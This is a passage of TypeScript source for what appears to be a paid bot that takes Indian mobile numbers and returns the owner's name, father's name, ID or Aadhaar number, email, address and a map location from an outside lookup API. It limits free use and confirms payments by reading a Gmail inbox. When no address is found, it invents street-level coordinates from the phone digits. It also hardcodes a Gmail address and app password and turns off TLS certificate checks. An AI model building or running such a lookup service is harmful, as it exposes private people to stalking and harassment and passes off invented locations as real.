    const daysLeft = getRemainingDays(user.premiumUntil);
    return `<b>✦ ${toThinSans(`VIP Unlimited (${daysLeft}D Left)`)}</b>`;
  }
  return `<b>◈ ${toThinSans(`Daily Limit: ${remainingToday}/${dailyLimit} Left`)}</b>`;
}

// ============================================================================
// REAL HEX OSINT & GOOGLE MAPS GEOCODING ENGINE
// ============================================================================
export interface OsintRecord {
  name: string;
  truecallerName?: string;
  fatherName: string;
  mobile: string;
  altMobile: string;
  circle: string;
  idNumber: string;
  email: string;
  address: string;
  extraFields?: Record<string, string>;
}

export interface NumberIntelligence {
  formatted: string;
  rawDigits: string;
  valid: boolean;
  totalRecords: number;
  truecallerName?: string;
  records: OsintRecord[];
  lat: number;
  lng: number;
  mapsUrl: string;
  areaLabel: string;
  source: 'ftosint_live' | 'fallback';
}

const INDIAN_CIRCLE_COORDS: Array<{ keywords: string[]; lat: number; lng: number; label: string }> = [
  { keywords: ['delhi', 'new delhi', 'ncr', 'noida', 'gurgaon', 'gurugram', 'faridabad', 'ghaziabad'], lat: 28.6139, lng: 77.2090, label: 'New Delhi / NCR, India' },
  { keywords: ['mumbai', 'bombay', 'thane', 'navi mumbai'], lat: 19.0760, lng: 72.8777, label: 'Mumbai, Maharashtra' },
  { keywords: ['maharashtra', 'pune', 'nagpur', 'nashik', 'aurangabad'], lat: 18.5204, lng: 73.8567, label: 'Maharashtra, India' },
  { keywords: ['bihar', 'patna', 'gaya', 'muzaffarpur', 'bhagalpur', 'darbhanga'], lat: 25.5941, lng: 85.1376, label: 'Patna, Bihar' },
  { keywords: ['jharkhand', 'ranchi', 'jamshedpur', 'dhanbad', 'bokaro'], lat: 23.3441, lng: 85.3096, label: 'Ranchi, Jharkhand' },
  { keywords: ['up east', 'up west', 'uttar pradesh', 'lucknow', 'kanpur', 'varanasi', 'agra', 'meerut', 'prayagraj', 'allahabad', 'gorakhpur'], lat: 26.8467, lng: 80.9462, label: 'Lucknow, Uttar Pradesh' },
  { keywords: ['rajasthan', 'jaipur', 'jodhpur', 'udaipur', 'kota', 'ajmer', 'bikaner'], lat: 26.9124, lng: 75.7873, label: 'Jaipur, Rajasthan' },
  { keywords: ['mp', 'madhya pradesh', 'bhopal', 'indore', 'gwalior', 'jabalpur', 'ujjain'], lat: 23.2599, lng: 77.4126, label: 'Bhopal, Madhya Pradesh' },
  { keywords: ['chhattisgarh', 'raipur', 'bilaspur', 'bhilai', 'durg'], lat: 21.2514, lng: 81.6296, label: 'Raipur, Chhattisgarh' },
  { keywords: ['gujarat', 'ahmedabad', 'surat', 'vadodara', 'rajkot', 'gandhinagar'], lat: 23.0225, lng: 72.5714, label: 'Ahmedabad, Gujarat' },
  { keywords: ['west bengal', 'kolkata', 'calcutta', 'howrah', 'siliguri', 'durgapur'], lat: 22.5726, lng: 88.3639, label: 'Kolkata, West Bengal' },
  { keywords: ['karnataka', 'bangalore', 'bengaluru', 'mysore', 'hubli', 'mangalore'], lat: 12.9716, lng: 77.5946, label: 'Bengaluru, Karnataka' },
  { keywords: ['tamil nadu', 'chennai', 'coimbatore', 'madurai', 'salem', 'trichy'], lat: 13.0827, lng: 80.2707, label: 'Chennai, Tamil Nadu' },
  { keywords: ['telangana', 'hyderabad', 'warangal', 'nizamabad'], lat: 17.3850, lng: 78.4867, label: 'Hyderabad, Telangana' },
  { keywords: ['andhra', 'visakhapatnam', 'vijayawada', 'guntur', 'tirupati'], lat: 16.5062, lng: 80.6480, label: 'Vijayawada, Andhra Pradesh' },
  { keywords: ['kerala', 'kochi', 'thiruvananthapuram', 'kozhikode', 'thrissur'], lat: 9.9312, lng: 76.2673, label: 'Kochi, Kerala' },
  { keywords: ['punjab', 'chandigarh', 'ludhiana', 'amritsar', 'jalandhar', 'patiala'], lat: 30.7333, lng: 76.7794, label: 'Chandigarh / Punjab' },
  { keywords: ['haryana', 'rohtak', 'panipat', 'karnal', 'hisar', 'ambala'], lat: 29.0588, lng: 76.0856, label: 'Haryana, India' },
  { keywords: ['odisha', 'orissa', 'bhubaneswar', 'cuttack', 'rourkela', 'puri'], lat: 20.2961, lng: 85.8245, label: 'Bhubaneswar, Odisha' },
  { keywords: ['assam', 'guwahati', 'north east', 'silchar', 'dibrugarh'], lat: 26.1445, lng: 91.7362, label: 'Guwahati, Assam' },
  { keywords: ['himachal', 'shimla', 'manali', 'dharamshala', 'solan'], lat: 31.1048, lng: 77.1734, label: 'Shimla, Himachal Pradesh' },
  { keywords: ['uttarakhand', 'dehradun', 'haridwar', 'roorkee', 'haldwani'], lat: 30.3165, lng: 78.0322, label: 'Dehradun, Uttarakhand' },
  { keywords: ['jammu', 'kashmir', 'srinagar', 'j&k'], lat: 32.7266, lng: 74.8570, label: 'Jammu & Kashmir' },
];

async function geocodeAddressAndCircle(address: string, circle: string, rawDigits: string): Promise<{
  lat: number;
  lng: number;
  mapsUrl: string;
  areaLabel: string;
}> {
  const cleanAddr = address && address !== 'Not found' ? address : '';
  const cleanCircle = circle && circle !== 'Not found' ? circle : 'India';
  const combinedLower = `${cleanAddr} ${cleanCircle}`.toLowerCase();

  // Extract 6-digit Indian pincode if present in address
  const pinMatch = cleanAddr.match(/\b([1-8]\d{5})\b/);
  const pincode = pinMatch ? pinMatch[1] : '';

  // Try fast Nominatim geocoding on pincode or address segments first (timeout 2.2s)
  const queryToGeocode = pincode
    ? `${pincode}, India`
    : cleanAddr.length > 5
    ? `${cleanAddr.split(',').slice(-3).join(', ')}, India`
    : cleanCircle !== 'India'
    ? `${cleanCircle}, India`
    : '';

  if (queryToGeocode) {
    try {
      const geoUrl = `https://nominatim.openstreetmap.org/search?format=json&limit=1&countrycodes=in&q=${encodeURIComponent(
        queryToGeocode
      )}`;
      const resp = await fetchWithTimeout(
        geoUrl,
        { headers: { 'User-Agent': 'HexLocateBot/1.0' } },
        2200
      );
      const geoArr: any = await resp.json();
      if (Array.isArray(geoArr) && geoArr.length > 0 && geoArr[0].lat && geoArr[0].lon) {
        const lat = Number(Number(geoArr[0].lat).toFixed(5));
        const lng = Number(Number(geoArr[0].lon).toFixed(5));
        const mapSearchQuery = cleanAddr ? `${cleanAddr}, India` : `${lat},${lng}`;
        return {
          lat,
          lng,
          mapsUrl: `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(mapSearchQuery)}`,
          areaLabel: String(geoArr[0].display_name || cleanCircle).split(',').slice(0, 3).join(',').trim(),
        };
      }
    } catch {
      // Fallback to circle/state table below
    }
  }

  for (const entry of INDIAN_CIRCLE_COORDS) {
    if (entry.keywords.some((kw) => combinedLower.includes(kw))) {
      // Deterministic micro-offset based on phone digits so pins in the same city have distinct street-level coordinates
      const seed = Number(rawDigits.slice(-4) || '1234');
      const dLat = ((seed % 100) - 50) * 0.0004;
      const dLng = ((Math.floor(seed / 100) % 100) - 50) * 0.0004;
      const lat = Number((entry.lat + dLat).toFixed(5));
      const lng = Number((entry.lng + dLng).toFixed(5));
      const mapSearchQuery = cleanAddr ? `${cleanAddr}, India` : `${lat},${lng}`;
      return {
        lat,
        lng,
        mapsUrl: `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(mapSearchQuery)}`,
        areaLabel: cleanAddr ? cleanAddr.split(',').slice(-2).join(', ').trim() : entry.label,
      };
    }
  }

  const seed = Number(rawDigits.slice(-4) || '1234');
  const defaultEntry = INDIAN_CIRCLE_COORDS[seed % INDIAN_CIRCLE_COORDS.length];
  const lat = Number((defaultEntry.lat + ((seed % 60) - 30) * 0.0005).toFixed(5));
  const lng = Number((defaultEntry.lng + ((seed % 40) - 20) * 0.0005).toFixed(5));
  const mapSearchQuery = cleanAddr ? `${cleanAddr}, India` : `${lat},${lng}`;
  return {
    lat,
    lng,
    mapsUrl: `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(mapSearchQuery)}`,
    areaLabel: cleanAddr ? cleanAddr.split(',').slice(-2).join(', ').trim() : defaultEntry.label,
  };
}

const numberInfoCache = new Map<string, { expiresAt: number; data: NumberIntelligence }>();

function cleanAddress(rawAddr?: string): string {
  if (!rawAddr) return 'Not found';
  const cleaned = String(rawAddr)
    .replace(/!+/g, ', ')
    .replace(/\s*,\s*,+/g, ', ')
    .replace(/^,\s*|\s*,\s*$/g, '')
    .replace(/\s+/g, ' ')
    .trim();
  if (!cleaned || cleaned === 'N/A' || cleaned.toLowerCase() === 'null' || cleaned.toLowerCase() === 'none') {
    return 'Not found';
  }
  return cleaned;
}

export function buildOsintApiLookupUrl(core: string, customUrl?: string, customKey?: string): string {
  const rawUrl = (customUrl ?? state.config.osintApiUrl ?? 'https://ftosint.world/api/number').trim();
  const rawKey = (customKey ?? state.config.osintApiKey ?? '').trim();

  if (rawUrl.includes('{num}') || rawUrl.includes('{number}') || rawUrl.includes('{mobile}')) {
    return rawUrl
      .replace(/\{num\}|\{number\}|\{mobile\}/gi, encodeURIComponent(core))
      .replace(/\{key\}|\{apikey\}/gi, encodeURIComponent(rawKey));
  }
  if (rawUrl.includes('?')) {
    if (rawUrl.endsWith('=') || rawUrl.endsWith('num=') || rawUrl.endsWith('number=') || rawUrl.endsWith('mobile=')) {
      return `${rawUrl}${encodeURIComponent(core)}`;
    }
    const hasKeyParam = /[?&](key|api_key|apikey|token)=/i.test(rawUrl);
    const keyPart = !hasKeyParam && rawKey ? `&key=${encodeURIComponent(rawKey)}` : '';
    return `${rawUrl}${keyPart}&num=${encodeURIComponent(core)}`;
  }
  if (rawKey) {
    return `${rawUrl}?key=${encodeURIComponent(rawKey)}&num=${encodeURIComponent(core)}`;
  }
  return `${rawUrl}?num=${encodeURIComponent(core)}`;
}

async function fetchRealNumberInfo(rawInput: string): Promise<NumberIntelligence> {
  const digits = rawInput.replace(/\D/g, '');
  let core = digits;
  if (digits.length === 12 && digits.startsWith('91')) {
    core = digits.slice(2);
  } else if (digits.length === 11 && digits.startsWith('0')) {
    core = digits.slice(1);
  } else if (digits.length > 10) {
    core = digits.slice(-10);
  }

  if (core.length !== 10 || !/^[6-9]\d{9}$/.test(core)) {
    return {
      formatted: rawInput,
      rawDigits: core,
      valid: false,
      totalRecords: 0,
      records: [],
      lat: 28.6139,
      lng: 77.2090,
      mapsUrl: 'https://www.google.com/maps',
      areaLabel: 'India',
      source: 'fallback',
    };
  }

  // Never leak the admin/merchant's own mobile number if someone searches it
  const merchantDigits = String(state.config.merchantUpiId || '').replace(/\D/g, '').slice(-10);
  if (merchantDigits.length === 10 && core === merchantDigits) {
    return {
      formatted: core,
      rawDigits: core,
      valid: true,
      totalRecords: 1,
      records: [
        {
          name: 'Not found',
          fatherName: 'Not found',
          mobile: core,
          altMobile: 'Not found',
          circle: 'India',
          idNumber: 'Not found',
          email: 'Not found',
          address: 'Not found',
        },
      ],
      lat: 28.6139,
      lng: 77.2090,
      mapsUrl: 'https://www.google.com/maps?q=28.6139,77.2090',
      areaLabel: 'New Delhi, India',
      source: 'fallback',
    };
  }

  const cached = numberInfoCache.get(core);
  if (cached && cached.expiresAt > Date.now()) {
    return cached.data;
  }

  const formatted = core;
  const apiUrl = buildOsintApiLookupUrl(core);

  try {
    const resp = await fetchWithTimeout(apiUrl, {}, 6500);
    const data: any = await resp.json();

    const rootTruecaller = String(data?.truecaller_name || data?.truecaller || '').trim();

    const list: any[] = Array.isArray(data?.results)
      ? data.results
      : Array.isArray(data?.result)
      ? data.result
      : Array.isArray(data?.data)
      ? data.data
      : Array.isArray(data)
      ? data
      : data && typeof data === 'object' && (data.name || data.full_name || data.father_name || data.fname || data.address || data.circle || data.operator)
      ? [data]
      : [];

    const ignoredKeys = new Set([
      'name',
      'full_name',
      'fname',
      'father_name',
      'father',
      'mobile',
      'number',
      'phone',
      'alt',
      'alt_mobile',
      'alternate_number',
      'circle',
      'operator',
      'id',
      'id_number',
      'aadhar',
      'email',
      'address',
      'truecaller',
      'truecaller_name',
      'status',
      'success',
      'credit',
      'credits',
      'developer',
      'owner',
      'api_owner',
      'channel',
      'telegram',
      'join',
      'message',
      'msg',
      'code',
      'error',
    ]);

    if (list.length > 0) {
      const seen = new Set<string>();
      const records: OsintRecord[] = [];

      for (const item of list) {
        const name = String(item.name || item.full_name || rootTruecaller || 'Not found').trim();
        const fatherName = String(item.fname || item.father_name || item.father || 'Not found').trim();
        const mobile = String(item.mobile || item.number || item.phone || core).trim();
        const altMobile = String(item.alt || item.alt_mobile || item.alternate_number || 'Not found').trim();
        const circle = String(item.circle || item.operator || 'India').trim();
        const idNumber = String(item.id || item.id_number || item.aadhar || 'Not found').trim();
        const email = String(item.email || 'Not found').trim();
        const address = cleanAddress(item.address);

        const extraFields: Record<string, string> = {};
        if (item && typeof item === 'object') {
          for (const [k, v] of Object.entries(item)) {
            const lowerK = k.toLowerCase();
            if (!ignoredKeys.has(lowerK) && (typeof v === 'string' || typeof v === 'number')) {
              const strVal = cleanAddress(String(v));
              if (strVal && strVal !== 'Not found') {
                extraFields[k] = strVal;
              }
            }
          }
        }

        const dedupKey = `${name}|${fatherName}|${address}|${altMobile}|${idNumber}|${email}`.toLowerCase();
        if (!seen.has(dedupKey)) {
          seen.add(dedupKey);
          records.push({
            name: name === 'N/A' ? 'Not found' : name,
            truecallerName: rootTruecaller && rootTruecaller !== 'N/A' ? rootTruecaller : undefined,
            fatherName: fatherName === 'N/A' ? 'Not found' : fatherName,
            mobile,
            altMobile: altMobile === 'N/A' ? 'Not found' : altMobile,
            circle: circle === 'N/A' ? 'Not found' : circle,
            idNumber: idNumber === 'N/A' ? 'Not found' : idNumber,
            email: email === 'N/A' ? 'Not found' : email,
            address,
            extraFields: Object.keys(extraFields).length > 0 ? extraFields : undefined,
          });
        }
      }

      if (records.length > 0) {
        const primaryRec = records.find((r) => r.address && r.address !== 'Not found') || records[0];
        const geo = await geocodeAddressAndCircle(primaryRec.address, primaryRec.circle, core);
        const resultObj: NumberIntelligence = {
          formatted,
          rawDigits: core,
          valid: true,
          totalRecords: records.length,
          truecallerName: rootTruecaller && rootTruecaller !== 'N/A' ? rootTruecaller : undefined,
          records,
          lat: geo.lat,
          lng: geo.lng,
          mapsUrl: geo.mapsUrl,
          areaLabel: geo.areaLabel,
          source: 'ftosint_live',
        };
        numberInfoCache.set(core, { expiresAt: Date.now() + 15 * 60 * 1000, data: resultObj });
        return resultObj;
      }
    }

    if (rootTruecaller && rootTruecaller !== 'N/A') {
      const geo = await geocodeAddressAndCircle('Not found', 'India', core);
      const resultObj: NumberIntelligence = {
        formatted,
        rawDigits: core,
        valid: true,
        totalRecords: 1,
        truecallerName: rootTruecaller,
        records: [
          {
            name: rootTruecaller,
            truecallerName: rootTruecaller,
            fatherName: 'Not found',
            mobile: core,
            altMobile: 'Not found',
            circle: geo.areaLabel,
            idNumber: 'Not found',
            email: 'Not found',
            address: geo.areaLabel,
          },
        ],
        lat: geo.lat,
        lng: geo.lng,
        mapsUrl: geo.mapsUrl,
        areaLabel: geo.areaLabel,
        source: 'ftosint_live',
      };
      numberInfoCache.set(core, { expiresAt: Date.now() + 15 * 60 * 1000, data: resultObj });
      return resultObj;
    }
  } catch (err: any) {
    console.error('OSINT API call error:', err.message);
  }

  const fallbackGeo = await geocodeAddressAndCircle('Not found', 'India', core);
  return {
    formatted,
    rawDigits: core,
    valid: true,
    totalRecords: 1,
    records: [
      {
        name: 'Not found',
        fatherName: 'Not found',
        mobile: core,
        altMobile: 'Not found',
        circle: fallbackGeo.areaLabel,
        idNumber: 'Not found',
        email: 'Not found',
        address: fallbackGeo.areaLabel,
      },
    ],
    lat: fallbackGeo.lat,
    lng: fallbackGeo.lng,
    mapsUrl: fallbackGeo.mapsUrl,
    areaLabel: fallbackGeo.areaLabel,
    source: 'fallback',
  };
}

function recordLookupHistory(user: UserProfile, info: NumberIntelligence, source: 'bot' | 'web') {
  const primary = info.records[0] || {
    name: 'Not found',
    fatherName: 'Not found',
    mobile: info.rawDigits,
    altMobile: 'Not found',
    circle: 'Not found',
    idNumber: 'Not found',
    email: 'Not found',
    address: 'Not found',
  };
  const item: LookupHistoryItem = {
    id: crypto.randomUUID(),
    queryNumber: info.rawDigits,
    timestamp: new Date().toISOString(),
    source,
    userId: user.id,
    userName: user.firstName,
    resultSummary: {
      name: primary.name,
      truecallerName: info.truecallerName,
      fatherName: primary.fatherName,
      mobile: primary.mobile,
      altMobile: primary.altMobile,
      circle: primary.circle,
      idNumber: primary.idNumber,
      email: primary.email,
      address: primary.address !== 'Not found' ? primary.address : info.areaLabel,
      totalRecords: info.totalRecords,
      lat: info.lat,
      lng: info.lng,
      mapsUrl: info.mapsUrl,
    },
  };

  if (!Array.isArray(user.history)) user.history = [];
  user.history = [item, ...user.history.filter((h) => h.queryNumber !== info.rawDigits)].slice(0, 20);
  state.globalHistory = [item, ...state.globalHistory].slice(0, 100);
  saveState();
}

// ============================================================================
// DIRECT UPI QR SCANNER + GMAIL APP PASSWORD AUTO-VERIFICATION ENGINE
// ============================================================================
function decodeImapEmailContent(raw: string): string {
  // 1. Decode quoted-printable soft line breaks and hex bytes (e.g. =E2=82=B9 -> ₹)
  const softUnwrapped = raw.replace(/=\r?\n/g, '');
  const qpDecoded = softUnwrapped.replace(/(?:=[0-9A-Fa-f]{2})+/g, (match) => {
    try {
      const hex = match.replace(/=/g, '');
      return Buffer.from(hex, 'hex').toString('utf-8');
    } catch {
      return match;
    }
  });

  // 2. Also decode any base64-encoded MIME blocks if present
  let b64Extra = '';
  const b64Matches = raw.match(/(?:Content-Transfer-Encoding:\s*base64[\s\S]*?\r?\n\r?\n)([A-Za-z0-9+/=\r\n]{32,})/gi);
  if (b64Matches) {
    for (const block of b64Matches) {
      const parts = block.split(/\r?\n\r?\n/);
      const payload = parts.slice(1).join('').replace(/[^A-Za-z0-9+/=]/g, '');
      if (payload.length >= 24) {
        try {
          b64Extra += ' ' + Buffer.from(payload, 'base64').toString('utf-8');
        } catch {
          // ignore
        }
      }
    }
  }

  const combined = `${qpDecoded} ${b64Extra}`;
  return combined
    .replace(/<style[\s\S]*?<\/style>/gi, ' ')
    .replace(/<script[\s\S]*?<\/script>/gi, ' ')
    .replace(/&#8377;|&#x20b9;|&inr;/gi, '₹')
    .replace(/&nbsp;/gi, ' ')
    .replace(/<[^>]+>/g, ' ')
    .replace(/\s+/g, ' ')
    .trim();
}

export interface ParsedGmailPaymentMessage {
  uid: string;
  internalDate: string;
  timestampMs: number;
  subject: string;
  from: string;
  decodedText: string;
  amounts: number[];
  utr?: string;
}

let isImapScanning = false;
let lastGmailScanAt = 0;
const cachedGmailEmails = new Map<string, ParsedGmailPaymentMessage>();

function parseFetchBlocksFromBuffer(rawFetch: string): ParsedGmailPaymentMessage[] {
  const parsedEmails: ParsedGmailPaymentMessage[] = [];
  const blocks = rawFetch.split(/\*\s+\d+\s+FETCH\s+\(/i).slice(1);

  for (const block of blocks) {
    const uidMatch = block.match(/UID\s+(\d+)/i);
    const dateMatch = block.match(/INTERNALDATE\s+"([^"]+)"/i);
    const subjMatch = block.match(/Subject:\s*([^\r\n]+(?:\r?\n[ \t]+[^\r\n]+)*)/i);
    const fromMatch = block.match(/From:\s*([^\r\n]+)/i);

    if (!uidMatch || (!subjMatch && !fromMatch)) continue;

    const uid = uidMatch[1];
    const internalDate = dateMatch ? dateMatch[1] : new Date().toISOString();
    const timestampMs = new Date(internalDate).getTime() || Date.now();
    const subject = subjMatch ? decodeImapEmailContent(subjMatch[1]) : '';
    const from = fromMatch ? decodeImapEmailContent(fromMatch[1]) : '';
    const decodedText = `${from} ${subject} ${decodeImapEmailContent(block)}`.trim();

    const amounts: number[] = [];
    const amtRegexes = [
      /(?:₹|rs\.?|inr)\s*([0-9]+(?:\.[0-9]{1,2})?)/gi,
      /([0-9]+(?:\.[0-9]{1,2})?)\s*(?:₹|rs\.?|inr)/gi,
      /(?:amount|received|credited|paid)\s*(?:of|:|-)?\s*(?:₹|rs\.?|inr)?\s*([0-9]+(?:\.[0-9]{1,2})?)/gi,
    ];
    for (const rx of amtRegexes) {
      let m: RegExpExecArray | null;
      while ((m = rx.exec(decodedText)) !== null) {
        const val = Number(m[1]);
        if (!isNaN(val) && val > 0 && val < 100000 && !amounts.includes(val)) {
          amounts.push(val);
        }
      }
    }

    const utrMatch = decodedText.match(/\b(\d{12})\b/);
    const msg: ParsedGmailPaymentMessage = {
      uid,
      internalDate,
      timestampMs,
      subject,
      from,
      decodedText,
      amounts,
      utr: utrMatch ? utrMatch[1] : undefined,
    };
    parsedEmails.push(msg);
    cachedGmailEmails.set(uid, msg);
  }
  return parsedEmails;
}

async function matchEmailsToOrders(emails: ParsedGmailPaymentMessage[], specificOrder?: PaymentOrder) {
  if (!emails || emails.length === 0) return;
  if (!Array.isArray(state.usedEmailIds)) {
    state.usedEmailIds = [];
  }

  const nowMs = Date.now();
  const candidateOrders = Object.values(state.orders).filter((o) => {
    if (o.status === 'PAID') return false;
    if (specificOrder && o.orderId === specificOrder.orderId) return true;
    const ageMs = nowMs - new Date(o.createdAt).getTime();
    return ageMs <= 2 * 60 * 60 * 1000;
  });

  // Sort newest orders first so the user's latest QR order gets matched first
  candidateOrders.sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime());

  for (const pendingOrd of candidateOrders) {
    if ((pendingOrd.status as string) === 'PAID') continue;
    const ordCreatedMs = new Date(pendingOrd.createdAt).getTime();
    const targetAmt = Number(pendingOrd.payableAmount || pendingOrd.amount);

    for (const email of emails) {
      const emailKey = `gmail_${email.uid}`;
      if (state.usedEmailIds.includes(emailKey)) continue;

      // Email must have arrived after the order was created (with 120s tolerance) and within 45 mins after creation
      if (email.timestampMs < ordCreatedMs - 120 * 1000) continue;
      if (email.timestampMs > ordCreatedMs + 45 * 60 * 1000) continue;

      const lower = `${email.from} ${email.subject} ${email.decodedText}`.toLowerCase();
      const isPaymentMail =
        lower.includes('fampay') ||
        lower.includes('famx') ||
        lower.includes('famapp') ||
        lower.includes('fam') ||
        lower.includes('upi') ||
        lower.includes('received') ||
        lower.includes('credited') ||
        lower.includes('paid you') ||
        lower.includes('sent you') ||
        lower.includes('has sent') ||
        lower.includes('money received') ||
        lower.includes(pendingOrd.orderId.toLowerCase());

      if (!isPaymentMail) continue;

      const hasOrderIdMatch =
        email.decodedText.toLowerCase().includes(pendingOrd.orderId.toLowerCase()) ||
        (pendingOrd.famOrderId &&
          email.decodedText.toLowerCase().includes(pendingOrd.famOrderId.toLowerCase()));

      const hasExactAmountMatch = email.amounts.some((amt) => Math.abs(amt - targetAmt) < 0.001);

      if (hasOrderIdMatch || hasExactAmountMatch) {
        state.usedEmailIds.push(emailKey);
        const finalUtr = email.utr || `GMAIL_${email.uid}`;
        await fulfillOrderAndNotify(pendingOrd, finalUtr);
        break;
      }
    }
  }
}

// Persistent IMAP Watcher — logs in ONCE, uses EXAMINE INBOX (~4s) to check UIDNEXT, and runs UID FETCH ONLY when UIDNEXT increases!
let persistentSocket: tls.TLSSocket | null = null;
let persistentReady = false;
let persistentBusy = false;
let highestFetchedUid = 0;
let persistentSeqCounter = 10;
let pendingScanWaiters: Array<() => void> = [];

function notifyScanWaiters() {
  const waiters = pendingScanWaiters.splice(0, pendingScanWaiters.length);
  for (const w of waiters) {
    try {
      w();
    } catch {}
  }
}

function triggerImapExamineCycle(): Promise<void> {
  if (!persistentSocket || !persistentReady) {
    return Promise.resolve();
  }
  return new Promise<void>((resolve) => {
    const timeoutId = setTimeout(() => {
      resolve();
    }, 11000);
    pendingScanWaiters.push(() => {
      clearTimeout(timeoutId);
      resolve();
    });
    if (!persistentBusy) {
      persistentBusy = true;
      const tag = `E${++persistentSeqCounter}`;
      try {
        persistentSocket.write(`${tag} EXAMINE INBOX\r\n`);
      } catch {
        persistentBusy = false;
        notifyScanWaiters();
      }
    }
  });
}

function startPersistentGmailImapWatcher() {
  const connectLoop = () => {
    const gmailUser = (state.config.gmailUser || 'vashudevx1451@gmail.com').trim();
    const appPass = (state.config.gmailAppPassword || 'ztxkbsoywmnuhthm').replace(/\s+/g, '');
    if (!gmailUser || !appPass) {
      setTimeout(connectLoop, 10000);
      return;
    }

    persistentReady = false;
    persistentBusy = false;

    const sock = tls.connect({
      host: 'imap.gmail.com',
      port: 993,
      servername: 'imap.gmail.com',
      rejectUnauthorized: false,
    });
    persistentSocket = sock;

    let step: 'GREETING' | 'LOGIN' | 'READY' = 'GREETING';
    let buf = '';

    sock.on('data', (chunk) => {
      const str = chunk.toString('utf-8');
      buf += str;

      if (step === 'GREETING' && /\* OK/i.test(buf)) {
        buf = '';
        step = 'LOGIN';
        sock.write(`A1 LOGIN "${gmailUser}" "${appPass}"\r\n`);
      } else if (step === 'LOGIN') {
        if (/A1 OK/i.test(buf)) {
          buf = '';
          step = 'READY';
          persistentReady = true;
          // Immediately run the initial EXAMINE INBOX + UID FETCH on startup
          void triggerImapExamineCycle();
        } else if (/A1 (NO|BAD)/i.test(buf)) {
          try {
            sock.destroy();
          } catch {}
        }
      } else if (step === 'READY') {
        // 1. Parse any FETCH blocks immediately as soon as they arrive
        if (/\*\s+\d+\s+FETCH\s+\(/i.test(buf) && /Subject:/i.test(buf)) {
          const newlyParsed = parseFetchBlocksFromBuffer(buf);
          for (const em of newlyParsed) {
            const numUid = Number(em.uid);
            if (!isNaN(numUid) && numUid > highestFetchedUid) {
              highestFetchedUid = numUid;
            }
          }
          if (newlyParsed.length > 0) {
            void matchEmailsToOrders(Array.from(cachedGmailEmails.values()));
          }
        }

        // 2. When EXAMINE INBOX completes: check UIDNEXT!
        if (/E\d+\s+OK/i.test(buf)) {
          const uidNextMatch = buf.match(/UIDNEXT\s+(\d+)/i);
          const uidNext = uidNextMatch ? Number(uidNextMatch[1]) : 0;
          const expectedMaxUid = uidNext > 0 ? uidNext - 1 : 0;
          buf = '';

          if (highestFetchedUid === 0 || (expectedMaxUid > 0 && expectedMaxUid > highestFetchedUid)) {
            const startUid =
              highestFetchedUid > 0
                ? highestFetchedUid + 1
                : Math.max(1, (expectedMaxUid || 630) - 5);
            const fTag = `F${++persistentSeqCounter}`;
            try {
              sock.write(
                `${fTag} UID FETCH ${startUid}:* (UID INTERNALDATE BODY.PEEK[HEADER.FIELDS (FROM SUBJECT DATE)])\r\n`
              );
              return;
            } catch {
              persistentBusy = false;
              notifyScanWaiters();
              return;
            }
          } else {
            // No new UID arrived since highestFetchedUid — match against cached emails in 0ms!
            persistentBusy = false;
            void matchEmailsToOrders(Array.from(cachedGmailEmails.values())).finally(() => {
              notifyScanWaiters();
            });
          }
        } else if (/E\d+\s+(NO|BAD)/i.test(buf)) {
          buf = '';
          persistentBusy = false;
          notifyScanWaiters();
        } else if (/F\d+\s+(OK|NO|BAD)/i.test(buf)) {
          const finalParsed = parseFetchBlocksFromBuffer(buf);
          for (const em of finalParsed) {
            const numUid = Number(em.uid);
            if (!isNaN(numUid) && numUid > highestFetchedUid) {
              highestFetchedUid = numUid;
            }
          }
          buf = '';
          persistentBusy = false;
          void matchEmailsToOrders(Array.from(cachedGmailEmails.values())).finally(() => {
            notifyScanWaiters();
          });
        }
      }
    });

    const keepAliveTimer = setInterval(() => {
      if (!persistentReady || persistentSocket !== sock || persistentBusy) return;
      const nowMs = Date.now();
      // Keep auto-verifying in background even if user clicked Cancel/Back or order expired within last 60 mins
      const hasActiveOrder = Object.values(state.orders).some(
        (o) => o.status !== 'PAID' && nowMs - new Date(o.createdAt).getTime() <= 60 * 60 * 1000
      );
      if (hasActiveOrder) {
        void triggerImapExamineCycle();
      }
    }, 3500);

    let reconnected = false;
    const cleanupAndReconnect = () => {
      if (reconnected) return;
      reconnected = true;
      clearInterval(keepAliveTimer);
      persistentReady = false;
      persistentBusy = false;
      notifyScanWaiters();
      if (persistentSocket === sock) persistentSocket = null;
      setTimeout(connectLoop, 3000);
    };

    sock.on('error', cleanupAndReconnect);
    sock.on('close', cleanupAndReconnect);
    sock.on('end', cleanupAndReconnect);
  };

  connectLoop();
}

export async function fetchRecentGmailPaymentEmails(
  customGmail?: string,
  customAppPass?: string
): Promise<{ ok: boolean; emails: ParsedGmailPaymentMessage[]; error?: string }> {
  const gmailUser = (customGmail ?? state.config.gmailUser ?? 'vashudevx1451@gmail.com').trim();
  const appPass = (customAppPass ?? state.config.gmailAppPassword ?? 'ztxkbsoywmnuhthm').replace(/\s+/g, '');

  if (!gmailUser || !appPass) {
    return { ok: false, emails: [], error: 'Gmail ID or App Password is empty' };
  }

  // If using the default merchant Gmail and our persistent connection is ready, use it without opening a duplicate socket!
  if (!customGmail && !customAppPass && persistentReady) {
    await triggerImapExamineCycle();
    if (cachedGmailEmails.size > 0) {
      return { ok: true, emails: Array.from(cachedGmailEmails.values()) };
    }
  }

  return new Promise((resolve) => {
    let settled = false;
    const finish = (result: { ok: boolean; emails: ParsedGmailPaymentMessage[]; error?: string }) => {
      if (settled) return;
      settled = true;
      try {
        socket.destroy();
      } catch {
        // ignore
      }
      resolve(result);
    };

    const socket = tls.connect({
      host: 'imap.gmail.com',
      port: 993,
      servername: 'imap.gmail.com',
      rejectUnauthorized: false,
    });

    const timer = setTimeout(() => {
      if (cachedGmailEmails.size > 0) {
        finish({ ok: true, emails: Array.from(cachedGmailEmails.values()) });
      } else {
        finish({ ok: false, emails: [], error: 'Gmail IMAP connection timed out (35s)' });
      }
    }, 35000);

    let buffer = '';
    let step: 'GREETING' | 'LOGIN' | 'SELECT' | 'FETCH' | 'DONE' = 'GREETING';

    socket.on('data', (chunk) => {
      buffer += chunk.toString('utf-8');

      if (step === 'GREETING' && /\* OK/i.test(buffer)) {
        buffer = '';
        step = 'LOGIN';
        socket.write(`A1 LOGIN "${gmailUser}" "${appPass}"\r\n`);
      } else if (step === 'LOGIN') {
        if (/A1 OK/i.test(buffer)) {
          buffer = '';
          step = 'SELECT';
